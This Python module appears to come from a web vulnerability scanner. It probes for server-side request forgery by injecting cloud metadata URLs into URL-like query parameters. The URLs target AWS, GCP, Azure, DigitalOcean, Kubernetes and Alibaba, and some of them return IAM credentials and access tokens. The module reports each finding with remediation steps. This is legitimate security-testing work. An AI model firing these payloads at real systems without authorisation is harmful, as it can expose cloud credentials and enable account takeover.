"""Cloud metadata SSRF scanner.

Tests for Server-Side Request Forgery targeting cloud provider
metadata endpoints (AWS, GCP, Azure, DigitalOcean, Kubernetes).
"""

from __future__ import annotations

from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from stryx.utils.evidence import Finding, Severity
from stryx.utils.http_client import HttpClient
from stryx.utils.logging import get_logger

logger = get_logger("scanner.cloud_ssrf")

# Cloud metadata endpoints with detection patterns
CLOUD_METADATA_ENDPOINTS = [
    # AWS
    {
        "provider": "AWS",
        "urls": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data/",
        ],
        "patterns": ["ami-id", "instance-id", "iam", "security-credentials", "local-hostname"],
        "severity": Severity.CRITICAL,
    },
    # GCP
    {
        "provider": "GCP",
        "urls": [
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        ],
        "patterns": ["computeMetadata", "instance", "service-accounts", "project-id"],
        "headers": {"Metadata-Flavor": "Google"},
        "severity": Severity.CRITICAL,
    },
    # Azure
    {
        "provider": "Azure",
        "urls": [
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        ],
        "patterns": ["compute", "network", "subscriptionId", "vmId", "access_token"],
        "headers": {"Metadata": "true"},
        "severity": Severity.CRITICAL,
    },
    # DigitalOcean
    {
        "provider": "DigitalOcean",
        "urls": [
            "http://169.254.169.254/metadata/v1/",
            "http://169.254.169.254/metadata/v1/hostname",
            "http://169.254.169.254/metadata/v1/user-data",
        ],
        "patterns": ["hostname", "region", "user-data", "droplet_id"],
        "severity": Severity.CRITICAL,
    },
    # Kubernetes
    {
        "provider": "Kubernetes",
        "urls": [
            "https://kubernetes.default.svc/",
            "https://kubernetes.default.svc/api/v1/namespaces",
            "http://10.0.0.1:10255/pods",
        ],
        "patterns": ["apiVersion", "kind", "metadata", "items"],
        "severity": Severity.CRITICAL,
    },
    # Alibaba Cloud
    {
        "provider": "Alibaba Cloud",
        "urls": [
            "http://100.100.100.200/latest/meta-data/",
            "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
        ],
        "patterns": ["instance-id", "ram", "security-credentials"],
        "severity": Severity.CRITICAL,
    },
]


class CloudSSRFScanner:
    """Scanner for cloud metadata SSRF vulnerabilities."""

    def __init__(self, client: HttpClient):
        self.client = client

    async def scan(
        self,
        endpoints: list[str],
        base_url: str,
    ) -> list[Finding]:
        """Run cloud metadata SSRF tests."""
        findings: list[Finding] = []
        logger.info("Running cloud metadata SSRF scanner")

        # Find injectable parameters in endpoints
        injectable = self._find_injectable_endpoints(endpoints)

        for endpoint_config in CLOUD_METADATA_ENDPOINTS:
            for metadata_url in endpoint_config["urls"]:
                for endpoint, param_name, param_value in injectable:
                    finding = await self._test_ssrf(endpoint, param_name, metadata_url, endpoint_config)
                    if finding:
                        findings.append(finding)
                        break  # One finding per provider
                if findings and any(
                    f.scanner == "cloud-ssrf" and f.evidence.payload == metadata_url for f in findings[-1:]
                ):
                    break

        logger.info(f"Cloud SSRF scanner found {len(findings)} findings")
        return findings

    def _find_injectable_endpoints(self, endpoints: list[str]) -> list[tuple[str, str, str]]:
        """Find endpoints with URL-like parameters."""
        injectable = []

        for endpoint in endpoints:
            parsed = urlparse(endpoint)
            params = parse_qs(parsed.query)

            for param_name, values in params.items():
                value = values[0] if values else ""
                # Check if parameter looks like a URL
                if value.startswith("http") or param_name.lower() in (
                    "url",
                    "href",
                    "link",
                    "src",
                    "redirect",
                    "next",
                    "return",
                    "callback",
                    "webhook",
                    "fetch",
                    "load",
                    "proxy",
                    "target",
                ):
                    injectable.append((endpoint, param_name, value))

        return injectable

    async def _test_ssrf(
        self,
        endpoint: str,
        param_name: str,
        metadata_url: str,
        provider_config: dict,
    ) -> Finding | None:
        """Test a specific SSRF vector against a cloud metadata endpoint."""
        try:
            # Build test URL with metadata URL as parameter
            parsed = urlparse(endpoint)
            params = parse_qs(parsed.query)
            params[param_name] = [metadata_url]
            test_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

            # Send request
            extra_headers = provider_config.get("headers", {})
            response, evidence = await self.client.get(test_url, headers=extra_headers)

            # Check if response contains cloud metadata patterns
            body = response.text.lower()
            patterns = provider_config["patterns"]

            matched_patterns = [p for p in patterns if p.lower() in body]

            if matched_patterns and response.status_code == 200:
                provider = provider_config["provider"]
                severity = provider_config["severity"]

                evidence.confidence = min(0.95, 0.6 + len(matched_patterns) * 0.1)
                evidence.payload = metadata_url
                evidence.response_snippet = (
                    f"Cloud provider: {provider}\n"
                    f"Matched patterns: {', '.join(matched_patterns)}\n"
                    f"Response preview: {response.text[:300]}"
                )

                return Finding(
                    title=f"Cloud metadata SSRF to {provider} endpoint",
                    severity=severity,
                    evidence=evidence,
                    description=(
                        f"Server-Side Request Forgery to {provider} metadata endpoint detected. "
                        f"The application fetches {metadata_url} via parameter '{param_name}', "
                        f"exposing cloud credentials and instance metadata. "
                        f"Matched patterns: {', '.join(matched_patterns)}."
                    ),
                    remediation=(
                        "1. Block requests to internal/private IP ranges (169.254.0.0/16, 10.0.0.0/8, "
                        "172.16.0.0/12, 192.168.0.0/16)\n"
                        "2. Validate and whitelist allowed URL schemes (only https)\n"
                        "3. Use IMDSv2 on AWS (requires session token)\n"
                        "4. Implement network-level controls to block metadata access"
                    ),
                    cwe="CWE-918",
                    owasp="A10:2021 - Server-Side Request Forgery",
                    endpoint=endpoint,
                    scanner="cloud-ssrf",
                    tags=["ssrf", "cloud", provider.lower(), "critical"],
                )

        except Exception as e:
            logger.debug(f"Cloud SSRF test error: {e}")

        return None
